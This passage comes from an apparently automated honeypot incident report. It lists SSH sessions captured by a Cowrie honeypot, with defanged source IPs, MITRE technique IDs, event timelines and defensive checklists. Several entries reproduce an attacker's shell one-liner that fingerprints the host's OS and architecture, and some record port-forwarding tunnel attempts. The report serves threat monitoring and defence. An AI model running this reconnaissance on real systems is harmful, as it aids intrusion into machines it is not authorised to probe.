- [ ] Submit `154.92.23[.]249` to AbuseIPDB if not already reported
- [ ] Block `154.92.23[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e64af1cbf38d

| Field | Detail |
|---|---|
| **Source IP** | `154.92.23[.]249` |
| **First Seen** | 2026-07-29 09:01 |
| **Last Seen** | 2026-07-29 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:01:33` | `cowrie.session.connect` |
| `2026-07-29 09:01:33` | `cowrie.client.version` |
| `2026-07-29 09:01:33` | `cowrie.client.kex` |
| `2026-07-29 09:01:33` | `cowrie.login.success` |
| `2026-07-29 09:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.92.23[.]249` to AbuseIPDB if not already reported
- [ ] Block `154.92.23[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af393152fe0

| Field | Detail |
|---|---|
| **Source IP** | `154.92.23[.]249` |
| **First Seen** | 2026-07-29 09:01 |
| **Last Seen** | 2026-07-29 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:01:33` | `cowrie.session.connect` |
| `2026-07-29 09:01:33` | `cowrie.client.version` |
| `2026-07-29 09:01:33` | `cowrie.client.kex` |
| `2026-07-29 09:01:33` | `cowrie.login.success` |
| `2026-07-29 09:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.92.23[.]249` to AbuseIPDB if not already reported
- [ ] Block `154.92.23[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db7ad9cefd27

| Field | Detail |
|---|---|
| **Source IP** | `102.38.3[.]107` |
| **First Seen** | 2026-07-29 09:09 |
| **Last Seen** | 2026-07-29 09:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:09:42` | `cowrie.session.connect` |
| `2026-07-29 09:09:43` | `cowrie.client.version` |
| `2026-07-29 09:09:43` | `cowrie.client.kex` |
| `2026-07-29 09:09:44` | `cowrie.login.success` |
| `2026-07-29 09:09:45` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.38.3[.]107` to AbuseIPDB if not already reported
- [ ] Block `102.38.3[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb0a492f53f

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-07-29 09:09 |
| **Last Seen** | 2026-07-29 09:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:09:50` | `cowrie.session.connect` |
| `2026-07-29 09:09:51` | `cowrie.client.version` |
| `2026-07-29 09:09:51` | `cowrie.client.kex` |
| `2026-07-29 09:09:53` | `cowrie.login.success` |
| `2026-07-29 09:09:53` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a77e33b5e9e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:27 |
| **Last Seen** | 2026-07-29 09:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:27:53` | `cowrie.session.connect` |
| `2026-07-29 09:27:53` | `cowrie.client.version` |
| `2026-07-29 09:27:53` | `cowrie.client.kex` |
| `2026-07-29 09:27:56` | `cowrie.login.success` |
| `2026-07-29 09:27:58` | `cowrie.session.params` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.success` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:58` | `cowrie.command.input` |
| `2026-07-29 09:27:59` | `cowrie.log.closed` |
| `2026-07-29 09:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad46ba516d32

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:30 |
| **Last Seen** | 2026-07-29 09:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:30:41` | `cowrie.session.connect` |
| `2026-07-29 09:30:42` | `cowrie.client.version` |
| `2026-07-29 09:30:42` | `cowrie.client.kex` |
| `2026-07-29 09:30:46` | `cowrie.login.success` |
| `2026-07-29 09:30:48` | `cowrie.session.params` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.success` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:48` | `cowrie.command.input` |
| `2026-07-29 09:30:50` | `cowrie.log.closed` |
| `2026-07-29 09:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-143abd76418f

| Field | Detail |
|---|---|
| **Source IP** | `112.6.11[.]184` |
| **First Seen** | 2026-07-29 09:32 |
| **Last Seen** | 2026-07-29 09:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:32:15` | `cowrie.session.connect` |
| `2026-07-29 09:32:16` | `cowrie.client.version` |
| `2026-07-29 09:32:16` | `cowrie.client.kex` |
| `2026-07-29 09:32:19` | `cowrie.login.success` |
| `2026-07-29 09:32:20` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.11[.]184` to AbuseIPDB if not already reported
- [ ] Block `112.6.11[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9170cd834c

| Field | Detail |
|---|---|
| **Source IP** | `220.180.171[.]157` |
| **First Seen** | 2026-07-29 09:32 |
| **Last Seen** | 2026-07-29 09:32 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:32:25` | `cowrie.session.connect` |
| `2026-07-29 09:32:28` | `cowrie.client.version` |
| `2026-07-29 09:32:28` | `cowrie.client.kex` |
| `2026-07-29 09:32:34` | `cowrie.login.success` |
| `2026-07-29 09:32:35` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.171[.]157` to AbuseIPDB if not already reported
- [ ] Block `220.180.171[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f59a864085

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:33 |
| **Last Seen** | 2026-07-29 09:33 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:33:37` | `cowrie.session.connect` |
| `2026-07-29 09:33:38` | `cowrie.client.version` |
| `2026-07-29 09:33:38` | `cowrie.client.kex` |
| `2026-07-29 09:33:43` | `cowrie.login.success` |
| `2026-07-29 09:33:47` | `cowrie.session.params` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.success` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:47` | `cowrie.command.input` |
| `2026-07-29 09:33:49` | `cowrie.log.closed` |
| `2026-07-29 09:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd62c003326

| Field | Detail |
|---|---|
| **Source IP** | `144.22.210[.]132` |
| **First Seen** | 2026-07-29 09:35 |
| **Last Seen** | 2026-07-29 09:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:35:02` | `cowrie.session.connect` |
| `2026-07-29 09:35:02` | `cowrie.client.version` |
| `2026-07-29 09:35:02` | `cowrie.client.kex` |
| `2026-07-29 09:35:04` | `cowrie.login.success` |
| `2026-07-29 09:35:05` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.210[.]132` to AbuseIPDB if not already reported
- [ ] Block `144.22.210[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6678211b70ae

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:36 |
| **Last Seen** | 2026-07-29 09:36 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:36:37` | `cowrie.session.connect` |
| `2026-07-29 09:36:38` | `cowrie.client.version` |
| `2026-07-29 09:36:38` | `cowrie.client.kex` |
| `2026-07-29 09:36:43` | `cowrie.login.success` |
| `2026-07-29 09:36:46` | `cowrie.session.params` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.success` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:46` | `cowrie.command.input` |
| `2026-07-29 09:36:48` | `cowrie.log.closed` |
| `2026-07-29 09:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de277ca3223d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:39 |
| **Last Seen** | 2026-07-29 09:39 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:39:27` | `cowrie.session.connect` |
| `2026-07-29 09:39:29` | `cowrie.client.version` |
| `2026-07-29 09:39:29` | `cowrie.client.kex` |
| `2026-07-29 09:39:35` | `cowrie.login.success` |
| `2026-07-29 09:39:40` | `cowrie.session.params` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.success` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:40` | `cowrie.command.input` |
| `2026-07-29 09:39:41` | `cowrie.log.closed` |
| `2026-07-29 09:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21e9c0371bd

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-07-29 09:39 |
| **Last Seen** | 2026-07-29 09:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:39:29` | `cowrie.session.connect` |
| `2026-07-29 09:39:30` | `cowrie.client.version` |
| `2026-07-29 09:39:30` | `cowrie.client.kex` |
| `2026-07-29 09:39:31` | `cowrie.login.success` |
| `2026-07-29 09:39:32` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0802a91adc1

| Field | Detail |
|---|---|
| **Source IP** | `39.183.162[.]243` |
| **First Seen** | 2026-07-29 09:39 |
| **Last Seen** | 2026-07-29 09:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:39:38` | `cowrie.session.connect` |
| `2026-07-29 09:39:39` | `cowrie.client.version` |
| `2026-07-29 09:39:39` | `cowrie.client.kex` |
| `2026-07-29 09:39:42` | `cowrie.login.success` |
| `2026-07-29 09:39:43` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.183.162[.]243` to AbuseIPDB if not already reported
- [ ] Block `39.183.162[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a86e4b6bf82

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:42 |
| **Last Seen** | 2026-07-29 09:42 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:42:22` | `cowrie.session.connect` |
| `2026-07-29 09:42:23` | `cowrie.client.version` |
| `2026-07-29 09:42:23` | `cowrie.client.kex` |
| `2026-07-29 09:42:29` | `cowrie.login.success` |
| `2026-07-29 09:42:39` | `cowrie.session.params` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.success` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:39` | `cowrie.command.input` |
| `2026-07-29 09:42:40` | `cowrie.log.closed` |
| `2026-07-29 09:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a6a63fcb03

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 09:45 |
| **Last Seen** | 2026-07-29 09:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:45:13` | `cowrie.session.connect` |
| `2026-07-29 09:45:13` | `cowrie.client.version` |
| `2026-07-29 09:45:13` | `cowrie.client.kex` |
| `2026-07-29 09:45:14` | `cowrie.login.success` |
| `2026-07-29 09:45:14` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:45:14` | `cowrie.direct-tcpip.data` |
| `2026-07-29 09:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b708421cfb03

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:47 |
| **Last Seen** | 2026-07-29 09:48 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:47:50` | `cowrie.session.connect` |
| `2026-07-29 09:47:53` | `cowrie.client.version` |
| `2026-07-29 09:47:53` | `cowrie.client.kex` |
| `2026-07-29 09:48:05` | `cowrie.login.success` |
| `2026-07-29 09:48:11` | `cowrie.session.params` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.success` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:11` | `cowrie.command.input` |
| `2026-07-29 09:48:14` | `cowrie.log.closed` |
| `2026-07-29 09:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475e88717f7e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-29 09:49 |
| **Last Seen** | 2026-07-29 09:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:49:49` | `cowrie.session.connect` |
| `2026-07-29 09:49:49` | `cowrie.client.version` |
| `2026-07-29 09:49:49` | `cowrie.client.kex` |
| `2026-07-29 09:49:50` | `cowrie.login.success` |
| `2026-07-29 09:49:50` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:49:50` | `cowrie.direct-tcpip.ja4` |
| `2026-07-29 09:49:50` | `cowrie.direct-tcpip.data` |
| `2026-07-29 09:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
